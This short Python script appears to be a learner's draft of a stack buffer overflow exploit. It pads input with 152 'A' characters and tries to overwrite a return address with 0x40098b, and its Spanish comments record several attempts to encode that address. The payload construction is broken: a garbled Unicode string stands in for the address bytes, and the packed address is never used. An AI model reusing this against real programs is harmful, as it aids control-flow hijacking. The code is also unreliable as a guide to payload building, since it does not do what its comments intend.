import struct   
exp=""

pad="A"*152


buff=0x7fffffffde70 # quiero que entre aqui por que aqui
dir=0x40098b        #guardare esta pero con structpack
dir=struct.pack('< Q',dir)
buff2="ÿÞ൰"
#dir="0x0040099"
#0x00 00 00 00 00 40 09 8b
#8b\0x09\40\00\00\00\00
#dir="\0x8b\0x09\0x40\0x00\0x00\0x00\0x00\0x00"
#dir="8b09@"
#40 =@
#ord(0)

#dir=struct.pack('< Q',dir)

print("hola"+pad+buff2)
